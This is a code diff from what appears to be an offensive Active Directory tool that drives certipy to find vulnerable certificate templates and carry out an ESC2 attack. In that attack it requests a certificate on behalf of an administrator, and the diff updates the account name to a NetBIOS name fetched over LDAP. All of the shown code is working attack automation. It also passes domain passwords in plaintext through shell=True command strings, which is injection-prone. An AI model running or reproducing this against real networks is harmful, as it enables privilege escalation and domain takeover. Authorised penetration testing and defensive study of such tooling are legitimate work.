@@ -1,7 +1,9 @@
 import os, subprocess, glob, shutil, re
 from datetime import datetime
-from utils import general, commands
+from utils import general, commands,  ldap_queries
 from modules import ad_bloodhound
+
+current_date = general.current_date
 
 def describe_esc(esc):
     descriptions = {
@@ -27,11 +29,7 @@ def run_certipy_find(args):
 
     user_at_domain = f"{args.domain_user}@{args.domain}"
     cmd = f"certipy.pyz find -enabled -u {user_at_domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -stdout | tee ActiveDirectory/ADCS/{current_date}_FindResults.txt"
-    start = datetime.now()
-    print(f"\033[92m[*] Running: {cmd}\033[0m")
-    result = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    end = datetime.now()
-    log_command(cmd, start, end, args.dc_ip, "Success" if result.returncode == 0 else "Failed")
+    commands.single_command(cmd, args.dc_ip, "bright_cyan")
 
 def find_esc_vulns(certipy_dir):
     certipy_dir = os.path.expanduser(certipy_dir)
@@ -158,8 +156,10 @@ def certipy_ESC2(args, selected_template, selected_admin, target):
     print(f"\033[96mESC2 attack with: {esc2_cmd}\033[0m")
     subprocess.call(esc2_cmd, shell=True)
     
+    netbiosname = ldap_queries.get_netbios_name(args)
+    
     #Request on behalf of admin 
-    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template User -ca {ca_name} -on-behalf-of '{args.domain}\\{admin_account2}' -pfx {args.domain_user}.pfx -sid {sid}"
+    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template User -ca {ca_name} -on-behalf-of '{netbiosname}\\{admin_account2}' -pfx {args.domain_user}.pfx -sid {sid}"
     print(f"\033[96m[*] Running {esc2_pfx_cmd}\033[0m")
     subprocess.call(esc2_pfx_cmd, shell=True)
 
